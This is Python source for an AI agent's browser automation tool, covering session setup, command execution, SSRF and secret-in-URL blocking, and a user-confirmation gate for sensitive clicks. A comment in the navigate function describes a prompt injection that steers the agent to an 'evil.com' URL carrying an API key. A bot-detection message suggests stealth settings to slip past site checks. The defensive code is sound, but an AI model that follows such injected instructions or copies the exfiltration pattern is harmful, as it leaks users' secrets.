                    "type": "boolean",
                    "default": False,
                    "description": "If true, clear the message buffers after reading"
                },
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
                }
            },
            "required": []
        }
    },
]


# ============================================================================
# Utility Functions
# ============================================================================

def _preview_session_binding() -> dict[str, str] | None:
    """Resolve a shared WebUI-preview session binding from the environment.

    When Spark runs the agent on behalf of a WebUI workspace, it exports
    ``SPARK_BROWSER_PREVIEW_SESSION`` (the ``spark-preview-<slug>`` name) and
    ``SPARK_BROWSER_PREVIEW_PROFILE`` (the workspace's persistent profile dir).
    Binding the agent's local browser to that exact session + profile means the
    agent drives the SAME Chromium the preview pane is streaming, so the agent's
    navigation/clicks/typing show up live in the pane and vice-versa.

    Returns the session name + profile dir, or ``None`` when no binding is set.
    """
    name = (os.environ.get("SPARK_BROWSER_PREVIEW_SESSION") or "").strip()
    if not name:
        return None
    return {
        "session_name": name,
        "profile_dir": (os.environ.get("SPARK_BROWSER_PREVIEW_PROFILE") or "").strip(),
    }


def _create_local_session(task_id: str) -> dict[str, str]:
    import uuid

    binding = _preview_session_binding()
    if binding is not None:
        logger.info(
            "Bound local browser session %s to WebUI preview for task %s",
            binding["session_name"], task_id,
        )
        return {
            "session_name": binding["session_name"],
            "bb_session_id": None,
            "cdp_url": None,
            "profile_dir": binding.get("profile_dir") or None,
            "features": {"local": True, "preview_shared": True},
        }
    session_name = f"h_{uuid.uuid4().hex[:10]}"
    logger.info("Created local browser session %s for task %s",
                session_name, task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": None,
        "features": {"local": True},
    }


def _create_cdp_session(task_id: str, cdp_url: str) -> dict[str, str]:
    """Create a session that connects to a user-supplied CDP endpoint."""
    import uuid
    session_name = f"cdp_{uuid.uuid4().hex[:10]}"
    logger.info("Created CDP browser session %s → %s for task %s",
                session_name, cdp_url, task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": cdp_url,
        "features": {"cdp_override": True},
    }


def _get_session_info(task_id: str | None = None) -> dict[str, str]:
    """
    Get or create session info for the given task.

    In cloud mode, creates a Browserbase session with proxies enabled.
    In local mode, generates a session name for agent-browser --session.
    Also starts the inactivity cleanup thread and updates activity tracking.
    Thread-safe: multiple subagents can call this concurrently.

    Args:
        task_id: Unique identifier for the task

    Returns:
        Dict with session_name (always), bb_session_id + cdp_url (cloud only)
    """
    if task_id is None:
        task_id = "default"

    # Start the cleanup thread if not running (handles inactivity timeouts)
    _start_browser_cleanup_thread()

    # Update activity timestamp for this session
    _update_session_activity(task_id)

    with _cleanup_lock:
        # Check if we already have a session for this task
        if task_id in _active_sessions:
            return _active_sessions[task_id]

    # Create session outside the lock (network call in cloud mode)
    cdp_override = _get_cdp_override()
    if cdp_override:
        session_info = _create_cdp_session(task_id, cdp_override)
    else:
        provider = _get_cloud_provider()
        if provider is None:
            session_info = _create_local_session(task_id)
        else:
            session_info = provider.create_session(task_id)
            if session_info.get("cdp_url"):
                # Some cloud providers (including Browser-Use v3) return an HTTP
                # CDP discovery URL instead of a raw websocket endpoint.
                session_info = dict(session_info)
                session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))

    with _cleanup_lock:
        # Double-check: another thread may have created a session while we
        # were doing the network call. Use the existing one to avoid leaking
        # orphan cloud sessions.
        if task_id in _active_sessions:
            return _active_sessions[task_id]
        _active_sessions[task_id] = session_info

    return session_info



def _find_agent_browser() -> str:
    """
    Find the agent-browser CLI executable.

    Checks in order: current PATH, Homebrew/common bin dirs, Spark-managed
    node, local node_modules/.bin/, npx fallback.

    Returns:
        Path to agent-browser executable

    Raises:
        FileNotFoundError: If agent-browser is not installed
    """
    global _cached_agent_browser, _agent_browser_resolved
    if _agent_browser_resolved:
        if _cached_agent_browser is None:
            raise FileNotFoundError(
                "agent-browser CLI not found (cached). Install it with: "
                f"{_browser_install_hint()}\n"
                "Or run 'npm install' in the repo root to install locally.\n"
                "Or ensure npx is available in your PATH."
            )
        return _cached_agent_browser

    # Note: _agent_browser_resolved is set at each return site below
    # (not before the search) to prevent a race where a concurrent thread
    # sees resolved=True but _cached_agent_browser is still None.

    # Check if it's in PATH (global install)
    which_result = shutil.which("agent-browser")
    if which_result:
        _cached_agent_browser = which_result
        _agent_browser_resolved = True
        return which_result

    # Build an extended search PATH including Homebrew and Spark-managed dirs.
    # This covers macOS where the process PATH may not include Homebrew paths.
    extra_dirs: list[str] = []
    for d in ["/opt/homebrew/bin", "/usr/local/bin"]:
        if os.path.isdir(d):
            extra_dirs.append(d)
    extra_dirs.extend(_discover_homebrew_node_dirs())

    spark_home = get_spark_home()
    spark_node_bin = str(spark_home / "node" / "bin")
    if os.path.isdir(spark_node_bin):
        extra_dirs.append(spark_node_bin)

    if extra_dirs:
        extended_path = os.pathsep.join(extra_dirs)
        which_result = shutil.which("agent-browser", path=extended_path)
        if which_result:
            _cached_agent_browser = which_result
            _agent_browser_resolved = True
            return which_result

    # Check local node_modules/.bin/ (npm install in repo root)
    repo_root = Path(__file__).parent.parent
    local_bin = repo_root / "node_modules" / ".bin" / "agent-browser"
    if local_bin.exists():
        _cached_agent_browser = str(local_bin)
        _agent_browser_resolved = True
        return _cached_agent_browser

    # Check common npx locations (also search extended dirs)
    npx_path = shutil.which("npx")
    if not npx_path and extra_dirs:
        npx_path = shutil.which("npx", path=os.pathsep.join(extra_dirs))
    if npx_path:
        _cached_agent_browser = "npx agent-browser"
        _agent_browser_resolved = True
        return _cached_agent_browser

    # Nothing found — cache the failure so subsequent calls don't re-scan.
    _agent_browser_resolved = True
    raise FileNotFoundError(
        "agent-browser CLI not found. Install it with: "
        f"{_browser_install_hint()}\n"
        "Or run 'npm install' in the repo root to install locally.\n"
        "Or ensure npx is available in your PATH."
    )


def _extract_screenshot_path_from_text(text: str) -> str | None:
    """Extract a screenshot file path from agent-browser human-readable output."""
    if not text:
        return None

    patterns = [
        r"Screenshot saved to ['\"](?P<path>/[^'\"]+?\.png)['\"]",
        r"Screenshot saved to (?P<path>/\S+?\.png)(?:\s|$)",
        r"(?P<path>/\S+?\.png)(?:\s|$)",
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            path = match.group("path").strip().strip("'\"")
            if path:
                return path

    return None


def _run_browser_command(
    task_id: str,
    command: str,
    args: list[str] = None,
    timeout: int | None = None,
) -> dict[str, Any]:
    """
    Run an agent-browser CLI command using our pre-created Browserbase session.

    Args:
        task_id: Task identifier to get the right session
        command: The command to run (e.g., "open", "click")
        args: Additional arguments for the command
        timeout: Command timeout in seconds.  ``None`` reads
                 ``browser.command_timeout`` from config (default 30s).

    Returns:
        Parsed JSON response from agent-browser
    """
    if timeout is None:
        timeout = _get_command_timeout()
    args = args or []

    # Circuit breaker — once tripped, short-circuit every browser command with
    # a clear message so the agent stops retrying and burning its budget.
    if _breaker_is_open():
        return {"success": False, "error": _breaker_error(), "error_type": "circuit_open"}

    # Build the command
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        logger.warning("agent-browser CLI not found: %s", e)
        return {"success": False, "error": str(e)}

    if _requires_real_termux_browser_install(browser_cmd):
        error = _termux_browser_install_error()
        logger.warning("browser command blocked on Termux: %s", error)
        return {"success": False, "error": error}

    from tools.interrupt import is_interrupted
    if is_interrupted():
        return {"success": False, "error": "Interrupted"}

    # Get session info (creates Browserbase session with proxies if needed)
    try:
        session_info = _get_session_info(task_id)
    except Exception as e:
        logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
        return {"success": False, "error": f"Failed to create browser session: {str(e)}"}

    # Build the command with the appropriate backend flag.
    # Cloud mode: --cdp <websocket_url> connects to Browserbase.
    # Local mode: --session <name> launches a local headless Chromium.
    # The rest of the command (--json, command, args) is identical.
    if session_info.get("cdp_url"):
        # Cloud mode — connect to remote Browserbase browser via CDP
        # IMPORTANT: Do NOT use --session with --cdp. In agent-browser >=0.13,
        # --session creates a local browser instance and silently ignores --cdp.
        backend_args = ["--cdp", session_info["cdp_url"]]
    else:
        # Local mode — launch a headless Chromium instance
        backend_args = ["--session", session_info["session_name"]]
        # When bound to a WebUI workspace preview, use that workspace's
        # persistent profile so the agent shares cookies/logins with the pane.
        profile_dir = session_info.get("profile_dir")
        if profile_dir:
            backend_args += ["--profile", str(profile_dir)]

    # Keep concrete executable paths intact, even when they contain spaces.
    # Only the synthetic npx fallback needs to expand into multiple argv items.
    cmd_prefix = ["npx", "agent-browser"] if browser_cmd == "npx agent-browser" else [browser_cmd]

    cmd_parts = cmd_prefix + backend_args + [
        "--json",
        command
    ] + args

    try:
        # Give each task its own socket directory to prevent concurrency conflicts.
        # Without this, parallel workers fight over the same default socket path,
        # causing "Failed to create socket directory: Permission denied" errors.
        task_socket_dir = os.path.join(
            _socket_safe_tmpdir(),
            f"agent-browser-{session_info['session_name']}"
        )
        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
        logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                     command, task_id, task_socket_dir, len(task_socket_dir))

        browser_env = {**os.environ}

        # Ensure PATH includes Spark-managed Node first, Homebrew versioned
        # node dirs (for macOS ``brew install node@24``), then standard system dirs.
        spark_home = get_spark_home()
        spark_node_bin = str(spark_home / "node" / "bin")

        existing_path = browser_env.get("PATH", "")
        path_parts = [p for p in existing_path.split(":") if p]
        candidate_dirs = (
            [spark_node_bin]
            + list(_discover_homebrew_node_dirs())
            + [p for p in _SANE_PATH.split(":") if p]
        )

        for part in reversed(candidate_dirs):
            if os.path.isdir(part) and part not in path_parts:
                path_parts.insert(0, part)

        browser_env["PATH"] = ":".join(path_parts)
        browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir

        # Use temp files for stdout/stderr instead of pipes.
        # agent-browser starts a background daemon that inherits file
        # descriptors.  With capture_output=True (pipes), the daemon keeps
        # the pipe fds open after the CLI exits, so communicate() never
        # sees EOF and blocks until the timeout fires.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
        stdout_fd = None
        stderr_fd = None
        try:
            stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            proc = subprocess.Popen(
                cmd_parts,
                stdout=stdout_fd,
                stderr=stderr_fd,
                stdin=subprocess.DEVNULL,
                env=browser_env,
            )
        finally:
            if stdout_fd is not None:
                os.close(stdout_fd)
            if stderr_fd is not None:
                os.close(stderr_fd)

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
                           command, timeout, task_id, task_socket_dir)
            _record_browser_timeout()
            return {
                "success": False,
                "error": f"Command timed out after {timeout} seconds",
                "error_type": "timeout",
            }

        with open(stdout_path) as f:
            stdout = f.read()
        with open(stderr_path) as f:
            stderr = f.read()
        returncode = proc.returncode

        # Clean up temp files (best-effort)
        for p in (stdout_path, stderr_path):
            try:
                os.unlink(p)
            except OSError:
                pass

        # Log stderr for diagnostics — use warning level on failure so it's visible
        if stderr and stderr.strip():
            level = logging.WARNING if returncode != 0 else logging.DEBUG
            logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])

        stdout_text = stdout.strip()

        # Empty output with rc=0 is a broken state — treat as failure rather
        # than silently returning {"success": True, "data": {}}.
        # Some commands (close, record) legitimately return no output.
        if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
            logger.warning("browser '%s' returned empty output (rc=0)", command)
            return {"success": False, "error": f"Browser command '{command}' returned no output"}

        if stdout_text:
            try:
                parsed = json.loads(stdout_text)
                # Warn if snapshot came back empty (common sign of daemon/CDP issues)
                if command == "snapshot" and parsed.get("success"):
                    snap_data = parsed.get("data", {})
                    if not snap_data.get("snapshot") and not snap_data.get("refs"):
                        logger.warning("snapshot returned empty content. "
                                       "Possible stale daemon or CDP connection issue. "
                                       "returncode=%s", returncode)
                # A well-formed response (success or a structured failure)
                # resets the circuit breaker — the daemon is responsive.
                if isinstance(parsed, dict) and parsed.get("success"):
                    _record_browser_success()
                return parsed
            except json.JSONDecodeError:
                raw = stdout_text[:2000]
                logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
                               command, returncode, raw[:500])

                if command == "screenshot":
                    stderr_text = (stderr or "").strip()
                    combined_text = "\n".join(
                        part for part in [stdout_text, stderr_text] if part
                    )
                    recovered_path = _extract_screenshot_path_from_text(combined_text)

                    if recovered_path and Path(recovered_path).exists():
                        logger.info(
                            "browser 'screenshot' recovered file from non-JSON output: %s",
                            recovered_path,
                        )
                        return {
                            "success": True,
                            "data": {
                                "path": recovered_path,
                                "raw": raw,
                            },
                        }

                # Malformed / non-JSON daemon output is a DISTINCT failure
                # mode from a clean error or a timeout: it usually means
                # agent-browser/Chromium crashed mid-command or isn't fully
                # installed (e.g. it emitted an about:blank dump plus garbage).
                # Classify it explicitly so callers/tests can distinguish it
                # instead of leaking a truncated raw blob as a generic error.
                logger.warning(
                    "browser '%s' produced a malformed (non-JSON) daemon response; "
                    "the backend may have crashed or be partially installed", command,
                )
                return {
                    "success": False,
                    "error": (
                        f"Malformed (non-JSON) response from agent-browser for "
                        f"'{command}'. The browser backend likely crashed or is not "
                        f"fully installed. Repair it with: {_browser_install_hint()}."
                        f"{_headless_linux_hint()}"
                    ),
                    "error_type": "malformed_response",
                    "raw_output": raw,
                }

        # Check for errors
        if returncode != 0:
            error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
            logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
            return {"success": False, "error": error_msg}

        return {"success": True, "data": {}}

    except Exception as e:
        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
        return {"success": False, "error": str(e)}


def _extract_relevant_content(
    snapshot_text: str,
    user_task: str | None = None
) -> str:
    """Use LLM to extract relevant content from a snapshot based on the user's task.

    Falls back to simple truncation when no auxiliary text model is configured.
    """
    if user_task:
        extraction_prompt = (
            f"You are a content extractor for a browser automation agent.\n\n"
            f"The user's task is: {user_task}\n\n"
            f"Given the following page snapshot (accessibility tree representation), "
            f"extract and summarize the most relevant information for completing this task. Focus on:\n"
            f"1. Interactive elements (buttons, links, inputs) that might be needed\n"
            f"2. Text content relevant to the task (prices, descriptions, headings, important info)\n"
            f"3. Navigation structure if relevant\n\n"
            f"Keep ref IDs (like [ref=e5]) for interactive elements so the agent can use them.\n\n"
            f"Page Snapshot:\n{snapshot_text}\n\n"
            f"Provide a concise summary that preserves actionable information and relevant content."
        )
    else:
        extraction_prompt = (
            f"Summarize this page snapshot, preserving:\n"
            f"1. All interactive elements with their ref IDs (like [ref=e5])\n"
            f"2. Key text content and headings\n"
            f"3. Important information visible on the page\n\n"
            f"Page Snapshot:\n{snapshot_text}\n\n"
            f"Provide a concise summary focused on interactive elements and key content."
        )

    # Redact secrets from snapshot before sending to auxiliary LLM.
    # Without this, a page displaying env vars or API keys would leak
    # secrets to the extraction model before run_agent.py's general
    # redaction layer ever sees the tool result.
    from agent.redact import redact_sensitive_text
    extraction_prompt = redact_sensitive_text(extraction_prompt)

    try:
        call_kwargs = {
            "task": "web_extract",
            "messages": [{"role": "user", "content": extraction_prompt}],
            "max_tokens": 4000,
            "temperature": 0.1,
        }
        model = _get_extraction_model()
        if model:
            call_kwargs["model"] = model
        response = call_llm(**call_kwargs)
        extracted = (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
        # Redact any secrets the auxiliary LLM may have echoed back.
        return redact_sensitive_text(extracted)
    except Exception:
        return _truncate_snapshot(snapshot_text)


def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
    """Structure-aware truncation for snapshots.

    Cuts at line boundaries so that accessibility tree elements are never
    split mid-line, and appends a note telling the agent how much was
    omitted.

    Args:
        snapshot_text: The snapshot text to truncate
        max_chars: Maximum characters to keep

    Returns:
        Truncated text with indicator if truncated
    """
    if len(snapshot_text) <= max_chars:
        return snapshot_text

    lines = snapshot_text.split('\n')
    result: list[str] = []
    chars = 0
    for line in lines:
        if chars + len(line) + 1 > max_chars - 80:  # reserve space for note
            break
        result.append(line)
        chars += len(line) + 1
    remaining = len(lines) - len(result)
    if remaining > 0:
        result.append(f'\n[... {remaining} more lines truncated, use browser_snapshot for full content]')
    return '\n'.join(result)


# ============================================================================
# Browser Tool Functions
# ============================================================================

def browser_navigate(url: str, task_id: str | None = None) -> str:
    """
    Navigate to a URL in the browser.

    Args:
        url: The URL to navigate to
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result (includes stealth features info on first nav)
    """
    # Secret exfiltration protection — block URLs that embed API keys or
    # tokens in query parameters. A prompt injection could trick the agent
    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
    import urllib.parse

    from agent.redact import _PREFIX_RE
    url_decoded = urllib.parse.unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. "
                     "Secrets must not be sent in URLs.",
        })

    # SSRF protection — block private/internal addresses before navigating on
    # every backend.  ``browser.allow_private_urls`` opts out explicitly, while
    # explicit-port loopback URLs stay allowed for local preview/dev servers.
    if not _browser_private_network_allowed(url):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a private or internal address",
        })

    # Website policy check — block before navigating
    blocked = check_website_access(url)
    if blocked:
        return json.dumps({
            "success": False,
            "error": blocked["message"],
            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
        })

    # Camofox backend — delegate after safety checks pass
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_navigate
        return camofox_navigate(url, task_id)

    effective_task_id = task_id or "default"

    # Circuit breaker — if prior navigations already timed out repeatedly this
    # process, fail fast instead of attempting another hanging navigation.
    if _breaker_is_open():
        return json.dumps({"success": False, "error": _breaker_error()}, ensure_ascii=False)

    # Preflight health check — verify the backend can actually launch before
    # the (expensive, slow) first navigation. On a misconfigured headless VPS
    # this returns a fast, actionable error instead of hanging for 60s.
    healthy, health_err = _browser_backend_healthy()
    if not healthy:
        return json.dumps(
            {"success": False, "error": _backend_unhealthy_error(health_err)},
            ensure_ascii=False,
        )

    # Take-over: defer navigation when the user holds control of the session.
    paused = _takeover_check("navigate", task_id=effective_task_id)
    if paused is not None:
        return paused

    # Get session info to check if this is a new session
    # (will create one with features logged if not exists)
    session_info = _get_session_info(effective_task_id)
    is_first_nav = session_info.get("_first_nav", True)

    # Auto-start recording if configured and this is first navigation
    if is_first_nav:
        session_info["_first_nav"] = False
        _maybe_start_recording(effective_task_id)

    result = _run_browser_command(effective_task_id, "open", [url], timeout=max(_get_command_timeout(), 60))

    if result.get("success"):
        data = result.get("data", {})
        title = data.get("title", "")
        final_url = data.get("url", url)

        # Post-redirect SSRF check — if the browser followed a redirect to a
        # private/internal address, block the result so the model can't read
        # internal content via subsequent browser_snapshot calls.
        if final_url and final_url != url and not _browser_private_network_allowed(final_url):
            # Navigate away to a blank page to prevent snapshot leaks
            _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a private/internal address",
            })

        response = {
            "success": True,
            "url": final_url,
            "title": title
        }

        # Audit log only.  We deliberately do NOT mark the domain "known" here:
        # navigation always precedes a login, so a new-domain sign-in must still
        # trip the gate.  Domains become known only after an approved login.
        browser_action_log.record_action(
            "navigate", status="ok", task_id=effective_task_id,
            detail={"url": final_url, "title": title},
        )

        # Detect common "blocked" page patterns from title/url
        blocked_patterns = [
            "access denied", "access to this page has been denied",
            "blocked", "bot detected", "verification required",
            "please verify", "are you a robot", "captcha",
            "cloudflare", "ddos protection", "checking your browser",
            "just a moment", "attention required"
        ]
        title_lower = title.lower()

        if any(pattern in title_lower for pattern in blocked_patterns):
            response["bot_detection_warning"] = (
                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
                "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
                "4) Some sites have very aggressive bot detection that may be unavoidable."
            )

        # Include feature info on first navigation so model knows what's active
        if is_first_nav and "features" in session_info:
            features = session_info["features"]
            active_features = [k for k, v in features.items() if v]
            if not features.get("proxies"):
                response["stealth_warning"] = (
                    "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
                    "Consider upgrading Browserbase plan for proxy support."
                )
            response["stealth_features"] = active_features

        # Auto-take a compact snapshot so the model can act immediately
        # without a separate browser_snapshot call.
        try:
            snap_result = _run_browser_command(effective_task_id, "snapshot", ["-c"])
            if snap_result.get("success"):
                snap_data = snap_result.get("data", {})
                snapshot_text = snap_data.get("snapshot", "")
                refs = snap_data.get("refs", {})
                if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
                    snapshot_text = _truncate_snapshot(snapshot_text)
                response["snapshot"] = snapshot_text
                response["element_count"] = len(refs) if refs else 0
        except Exception as e:
            logger.debug("Auto-snapshot after navigate failed: %s", e)

        return json.dumps(response, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Navigation failed")
        }, ensure_ascii=False)


def browser_snapshot(
    full: bool = False,
    task_id: str | None = None,
    user_task: str | None = None
) -> str:
    """
    Get a text-based snapshot of the current page's accessibility tree.

    Args:
        full: If True, return complete snapshot. If False, return compact view.
        task_id: Task identifier for session isolation
        user_task: The user's current task (for task-aware extraction)

    Returns:
        JSON string with page snapshot
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_snapshot
        return camofox_snapshot(full, task_id, user_task)

    effective_task_id = task_id or "default"

    # Build command args based on full flag
    args = []
    if not full:
        args.extend(["-c"])  # Compact mode

    result = _run_browser_command(effective_task_id, "snapshot", args)

    if result.get("success"):
        data = result.get("data", {})
        snapshot_text = data.get("snapshot", "")
        refs = data.get("refs", {})

        # Check if snapshot needs summarization
        if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
            snapshot_text = _extract_relevant_content(snapshot_text, user_task)
        elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
            snapshot_text = _truncate_snapshot(snapshot_text)

        response = {
            "success": True,
            "snapshot": snapshot_text,
            "element_count": len(refs) if refs else 0
        }

        return json.dumps(response, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Failed to get snapshot")
        }, ensure_ascii=False)


def _current_page_url(task_id: str) -> str | None:
    """Best-effort lookup of the current page URL for gate/domain reasoning."""
    try:
        result = _run_browser_command(task_id, "console", ["--eval", "location.href"], timeout=10)
        if result.get("success"):
            data = result.get("data", {})
            val = data.get("result") or data.get("value") or data.get("eval")
            if isinstance(val, str) and val:
                return val
    except Exception as exc:  # noqa: BLE001
        logger.debug("current-url lookup failed: %s", exc)
    return None


def _resolve_ref_label(task_id: str, ref: str) -> str:
    """Best-effort human-readable label for a ref, for gate classification.

    Reads the current compact snapshot's refs map and returns the element's
    name/role text.  Falls back to empty string (treated as non-sensitive).
    """
    try:
        result = _run_browser_command(task_id, "snapshot", ["-c"], timeout=10)
        if not result.get("success"):
            return ""
        refs = result.get("data", {}).get("refs", {}) or {}
        key = ref.lstrip("@")
        meta = None
        if isinstance(refs, dict):
            meta = refs.get(key) or refs.get(ref)
        if isinstance(meta, dict):
            return " ".join(
                str(meta.get(k) or "")
                for k in ("role", "name", "label", "text", "value")
            ).strip()
        if isinstance(meta, str):
            return meta
    except Exception as exc:  # noqa: BLE001
        logger.debug("ref label lookup failed: %s", exc)
    return ""


def _takeover_check(action: str, *, task_id: str) -> str | None:
    """Return a JSON ``paused`` string when the user holds control, else None.

    When the user has grabbed control of the shared preview session (take-over),
    the agent's mutating actions must not fire — they'd fight the user for the
    page. We return a structured message telling the agent to wait and retry once
    the user hands control back, and record the deferral to the audit log.
    """
    if not browser_takeover.is_paused():
        return None
    browser_action_log.record_action(
        action, status="paused", task_id=task_id, detail={"reason": "user_takeover"},
    )
    return json.dumps({
        "success": False,
        "paused": True,
        "message": (
            "The user has taken control of the shared browser (e.g. to solve a "
            "login or CAPTCHA). Do not retry this action yet — wait for the user "
            "to hand control back, then continue."
        ),
    }, ensure_ascii=False)


def _gate_check(
    action: str,
    *,
    task_id: str,
    context_text: str,
    url: str | None = None,
) -> str | None:
    """Apply the permission gate to a pending sensitive action.

    Returns a JSON ``needs_confirmation`` string when the action is sensitive
    and not yet approved, else ``None`` (proceed).  Records the decision to the
    action log.
    """
    if not browser_permission_gate.gate_enabled():
        return None
    if url is None:
        url = _current_page_url(task_id)
    classification = browser_permission_gate.classify_action(
        action, url=url, context_text=context_text
    )
    if not classification.sensitive or browser_permission_gate.is_granted(classification):
        return None
    browser_action_log.record_action(
        "permission_required",
        status="needs_confirmation",
        detail={
            "action": action,
            "category": classification.category,
            "reason": classification.reason,
            "domain": classification.domain,
        },
        task_id=task_id,
    )
    return json.dumps({
        "success": False,
        "needs_confirmation": True,
        "category": classification.category,
        "reason": classification.reason,
        "domain": classification.domain,
        "message": (
            f"Sensitive action requires user confirmation: {classification.reason} "
            "Ask the user to confirm before proceeding. Once they approve, call this "
            "tool again with confirm=true to execute it."
        ),
    }, ensure_ascii=False)


def browser_a11y(interactive_only: bool = True, task_id: str | None = None) -> str:
    """Return the page accessibility tree as structured element refs.

    Uses agent-browser's native snapshot (ariaSnapshot + refs map).  The refs
    returned here (``@e5`` etc.) are the same ones browser_click / browser_type
    accept.  Far cheaper than a screenshot and reliable for clicking.
    """
    if _is_camofox_mode():
        # Camofox exposes the same accessibility snapshot via its snapshot path.
        from tools.browser_camofox import camofox_snapshot
        return camofox_snapshot(not interactive_only, task_id, None)

    effective_task_id = task_id or "default"
    args = ["-c"] if interactive_only else []
    result = _run_browser_command(effective_task_id, "snapshot", args)

    if not result.get("success"):
        browser_action_log.record_action(
            "a11y", status="error", task_id=effective_task_id,
            detail={"error": result.get("error")},
        )
        return json.dumps({
            "success": False,
            "error": result.get("error", "Failed to get accessibility tree"),
        }, ensure_ascii=False)

    data = result.get("data", {})
    refs = data.get("refs", {}) or {}
    snapshot_text = data.get("snapshot", "")

    # Normalise refs into a structured element list.  agent-browser returns a
    # mapping of ref-id -> element metadata; tolerate both dict and list shapes.
    elements: list[dict[str, Any]] = []
    if isinstance(refs, dict):
        for ref_id, meta in refs.items():
            ref = ref_id if str(ref_id).startswith("@") else f"@{ref_id}"
            if isinstance(meta, dict):
                elements.append({
                    "ref": ref,
                    "role": meta.get("role") or meta.get("type"),
                    "name": meta.get("name") or meta.get("label") or meta.get("text"),
                    "value": meta.get("value"),
                })
            else:
                elements.append({"ref": ref, "name": str(meta)})
    elif isinstance(refs, list):
        for meta in refs:
            if isinstance(meta, dict):
                ref_id = meta.get("ref") or meta.get("id") or ""
                ref = ref_id if str(ref_id).startswith("@") else f"@{ref_id}"
                elements.append({
                    "ref": ref,
                    "role": meta.get("role") or meta.get("type"),
                    "name": meta.get("name") or meta.get("label") or meta.get("text"),
                    "value": meta.get("value"),
                })

    browser_action_log.record_action(
        "a11y", status="ok", task_id=effective_task_id,
        detail={"element_count": len(elements), "interactive_only": interactive_only},
    )

    response: dict[str, Any] = {
        "success": True,
        "element_count": len(elements),
        "elements": elements,
    }
    # When refs weren't structured, fall back to the textual a11y tree so the
    # agent still gets usable refs.
    if not elements and snapshot_text:
        response["tree"] = _truncate_snapshot(snapshot_text)
    return json.dumps(response, ensure_ascii=False)


def browser_click(ref: str, task_id: str | None = None, confirm: bool = False) -> str:
    """
    Click on an element.

    Args:
        ref: Element reference (e.g., "@e5")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with click result
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_click
        return camofox_click(ref, task_id)

    effective_task_id = task_id or "default"

    # Take-over: if the user holds control of the shared session, defer.
    paused = _takeover_check("click", task_id=effective_task_id)
    if paused is not None:
        return paused

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    # Permission gate — clicking a "Pay"/"Send"/"Sign in" control is the
    # canonical sensitive action.  Classify using the element label.
    if not confirm:
        label = _resolve_ref_label(effective_task_id, ref)
        gated = _gate_check("click", task_id=effective_task_id, context_text=label)
        if gated is not None:
            return gated

    result = _run_browser_command(effective_task_id, "click", [ref])

    if result.get("success"):
        if confirm:
            url = _current_page_url(effective_task_id)
            classification = browser_permission_gate.classify_action(
                "click", url=url,
                context_text=_resolve_ref_label(effective_task_id, ref),
            )
            browser_permission_gate.grant(classification)
            if classification.category == browser_permission_gate.CATEGORY_LOGIN_NEW_DOMAIN:
                browser_permission_gate.note_login_domain(url)
        browser_action_log.record_action(
            "click", status="ok", task_id=effective_task_id, detail={"ref": ref},
        )
        return json.dumps({
            "success": True,
            "clicked": ref
        }, ensure_ascii=False)
    else:
        browser_action_log.record_action(
            "click", status="error", task_id=effective_task_id,
            detail={"ref": ref, "error": result.get("error")},
        )
        return json.dumps({
            "success": False,
            "error": result.get("error", f"Failed to click {ref}")
        }, ensure_ascii=False)


def browser_type(ref: str, text: str, task_id: str | None = None, confirm: bool = False) -> str:
    """
    Type text into an input field.

    Args:
        ref: Element reference (e.g., "@e3")
        text: Text to type
        task_id: Task identifier for session isolation

    Returns:
        JSON string with type result
    """
    if _is_camofox_mode():
